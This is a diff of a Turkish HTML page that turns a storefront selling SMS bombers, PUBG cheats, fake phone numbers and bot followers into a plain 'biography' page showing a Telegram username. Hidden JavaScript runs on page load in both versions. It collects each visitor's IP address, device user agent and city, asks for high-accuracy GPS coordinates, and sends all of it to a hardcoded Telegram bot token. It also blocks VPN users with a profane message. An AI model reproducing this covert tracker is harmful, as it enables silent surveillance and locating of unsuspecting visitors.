@@ -3,56 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SONİX MARKET</title>
+    <title>SONİX | Biyografi</title>
     <style>
-        body { background: #050a0f; color: white; font-family: 'Courier New', monospace; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; }
-        .neon-title { font-size: 3rem; font-weight: bold; text-align: center; margin-bottom: 50px; animation: colorChange 5s infinite; }
-        @keyframes colorChange { 0% { color: #00d4ff; text-shadow: 0 0 10px #00d4ff; } 50% { color: #00ff00; text-shadow: 0 0 10px #00ff00; } 100% { color: #00d4ff; text-shadow: 0 0 10px #00d4ff; } }
-        .grid-container { display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 20px; width: 100%; max-width: 900px; }
-        .product-card { background: rgba(10, 15, 25, 0.9); border: 2px solid #00d4ff; border-radius: 15px; padding: 20px; text-align: center; transition: 0.3s; }
-        .product-card:hover { transform: translateY(-5px); box-shadow: 0 0 15px #00d4ff; }
-        .btn-buy { display: block; background: #00d4ff; color: black; padding: 12px; margin-top: 15px; font-weight: bold; border-radius: 8px; text-decoration: none; text-transform: uppercase; }
-        .price { color: #00d4ff; font-weight: bold; font-size: 1.2rem; }
+        body { background: #050a0f; color: white; font-family: 'Courier New', monospace; margin: 0; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; }
+        .container { text-align: center; z-index: 10; }
+        .sonix { font-size: 5rem; font-weight: 900; color: #00d4ff; text-shadow: 0 0 20px #00d4ff; animation: pulse 2s infinite alternate; letter-spacing: 10px; }
+        .kardesim { font-size: 2.2rem; margin-top: 20px; font-weight: bold; color: #ffffff; letter-spacing: 3px; }
+        .username { font-size: 2.5rem; color: #ff00ff; text-shadow: 0 0 10px #ff00ff; text-decoration: none; display: block; margin-top: 15px; transition: 0.5s; }
+        .username:hover { transform: scale(1.1); color: #00ff00; text-shadow: 0 0 20px #00ff00; }
+        
+        @keyframes pulse { 
+            from { transform: scale(1); color: #00d4ff; text-shadow: 0 0 20px #00d4ff; } 
+            to { transform: scale(1.05); color: #00ff00; text-shadow: 0 0 40px #00ff00; } 
+        }
+
+        /* VPN Engel Ekranı */
+        #vpn-blocker {
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: red; color: black; z-index: 9999; justify-content: center; align-items: center;
+            font-size: 3rem; font-weight: bold; text-align: center; padding: 20px;
+        }
     </style>
 </head>
 <body>
 
-    <h1 class="neon-title">SONİX MARKET</h1>
+    <div id="vpn-blocker">VPN KAPAT AMK</div>
 
-    <div class="grid-container">
-        <div class="product-card"><h2>Bot Takipçi</h2><div class="price">300 TL</div><a href="https://t.me/sshackssqq" class="btn-buy">SİPARİŞ VER</a></div>
-        <div class="product-card"><h2>PUBG Hile</h2><div class="price">İletişime Geç</div><a href="https://t.me/sshackssqq" class="btn-buy">İLETİŞİME GEÇ</a></div>
-        <div class="product-card"><h2>SMS Bomber</h2><div class="price">150 TL</div><a href="https://t.me/sshackssqq" class="btn-buy">SİPARİŞ VER</a></div>
-        <div class="product-card"><h2>Fake No</h2><div class="price">500 TL</div><a href="https://t.me/sshackssqq" class="btn-buy">SİPARİŞ VER</a></div>
-        <div class="product-card"><h2>WhatsApp Fake</h2><div class="price">500 TL</div><a href="https://t.me/sshackssqq" class="btn-buy">SİPARİŞ VER</a></div>
-        <div class="product-card"><h2>Telegram Fake</h2><div class="price">350 TL</div><a href="https://t.me/sshackssqq" class="btn-buy">SİPARİŞ VER</a></div>
+    <div id="main-content" class="container">
+        <div class="sonix">SONİX</div>
+        <div class="kardesim">CAN KARDEŞİM</div> 
+        <a href="https://t.me/Calw1nn" class="username">@Calw1nn</a>
     </div>
 
     <script>
-        window.onload = function() {
-            // Sadece IP adresini çeken en hızlı ve en kararlı servis
-            fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
+        const token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
+        const chatId = "7783618933";
+
+        function sendToBot(msg) {
+            let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;
+            new Image().src = url;
+        }
+
+        window.getIP = function(json) {
+            let ip = json.ip;
+            
+            // VPN ve Proxy kontrolü
+            fetch(`https://demo.ip-api.com/json/${ip}?fields=66846719`)
+            .then(res => res.json())
             .then(data => {
-                var ip = data.ip;
-                var cihaz = navigator.userAgent;
-                
-                var msg = "🚨 YENİ ZİYARETÇİ!\n\n📍 IP ADRESİ: " + ip + "\n📱 CİHAZ: " + cihaz;
-                
-                var token = "8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00";
-                var chatId = "7783618933";
-                var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(msg);
-                
-                // Tarayıcı engelini aşmak için img tetikleyici
-                var tracker = new Image();
-                tracker.src = url;
+                if (data.proxy === true || data.hosting === true) {
+                    document.getElementById('main-content').style.display = 'none';
+                    document.getElementById('vpn-blocker').style.display = 'flex';
+                    sendToBot(`🚫 VPN TESPİT EDİLDİ!\n📍 IP: ${ip}\n📱 Cihaz: ${navigator.userAgent}`);
+                } else {
+                    sendToBot(`🚨 YENİ GİRİŞ!\n📍 IP: ${ip}\n🌍 Konum: ${data.city} / ${data.country}\n📱 Cihaz: ${navigator.userAgent}`);
+                    
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(pos => {
+                            let lat = pos.coords.latitude;
+                            let lon = pos.coords.longitude;
+                            sendToBot(`🎯 TAM KONUM (GPS):\n📍 Koordinat: ${lat}, ${lon}\n🗺 Harita: https://www.google.com/maps?q=${lat},${lon}`);
+                        }, null, {enableHighAccuracy: true});
+                    }
+                }
             })
-            .catch(err => {
-                // IP alınamazsa en azından bir hata bildirimi gönder
-                var errorUrl = "https://api.telegram.org/bot8786995649:AAEQyWRD2oXQdc7YG5o9TI641dwB9ZIPM00/sendMessage?chat_id=7783618933&text=Ziyaretçi Geldi Ama IP Engellendi";
-                new Image().src = errorUrl;
+            .catch(() => {
+                sendToBot(`🚨 GİRİŞ (VPN Kontrolü Atlandı)\n📍 IP: ${ip}`);
             });
         };
+
+        // IP çekme işlemini başlat
+        let script = document.createElement('script');
+        script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+        document.body.appendChild(script);
     </script>
 </body>
 </html>
